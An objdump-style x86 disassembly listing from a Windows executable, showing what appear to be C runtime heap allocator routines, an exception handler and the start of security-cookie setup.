  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
